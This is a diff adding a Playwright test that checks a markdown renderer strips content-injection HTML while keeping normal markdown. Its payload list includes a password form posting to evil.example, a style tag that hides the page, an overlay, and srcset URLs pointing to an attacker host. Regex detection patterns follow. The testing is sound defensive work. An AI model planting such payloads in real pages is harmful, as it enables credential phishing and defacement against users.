@@ -70,6 +70,38 @@ test('XSS payloads are neutralised and global DOMPurify state does not leak', as
   expect(again.match(/target="_blank"/g)).toHaveLength(1);
 });
 
+test('content-injection vectors are stripped while normal markdown survives', async ({ page }) => {
+  const payload = [
+    '<style>body{display:none}</style>',
+    '<div style="position:fixed;top:0">overlay</div>',
+    '<form action="https://evil.example/p"><input type=password><button>go</button><textarea>t</textarea><select><option>o</option></select></form>',
+    '<img name=foo srcset="http://evil.example/a.png 2x" src="/a.png">',
+    '<a name=bar href="/y">named</a>',
+    '<video src="/v" poster="/p" controls></video><audio src="/a"></audio><picture><source srcset="http://evil.example/x"></picture>',
+    '<iframe src="/x"></iframe><object data="/x"></object><embed src="/x"><svg><a href="/x">s</a></svg><math><mi>m</mi></math>',
+    '',
+    '| h |\n|---|\n| c |',
+    '',
+    '```js\nlet a = 1;\n```',
+    '',
+    '![alt](/ok.png) [link](https://example.com)',
+  ].join('\n');
+  const out = await html(page, payload);
+  for (const re of [/<style/i, /<form/i, /<input/i, /<button/i, /<textarea/i, /<select/i, /<video/i, /<audio/i,
+    /<source/i, /<picture/i, /<iframe/i, /<object/i, /<embed/i, /<svg/i, /<math/i,
+    /\sstyle=/i, /\sname=/i, /srcset/i, /poster/i]) {
+    expect(out, String(re)).not.toMatch(re);
+  }
+  await mount(page, payload);
+  const root = page.locator('#root');
+  await expect(root.locator('div.table-wrap > table')).toHaveCount(1);
+  await expect(root.locator('.code-block code .token').first()).toBeVisible();
+  await expect(root.locator('img[src="/ok.png"]')).toHaveAttribute('loading', 'lazy');
+  await expect(root.locator('a[href="https://example.com"]')).toHaveAttribute('target', '_blank');
+  await expect(root.locator('img[src="/a.png"]')).toHaveCount(1); // image kept, only name/srcset removed
+  expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe('none');
+});
+
 test('returns fallback html when rendering throws', async ({ page }) => {
   const out = await page.evaluate(() => window.__h.renderMarkdown(Symbol('x')));
   expect(out).toBe('<p>Markdown rendering failed.</p>');
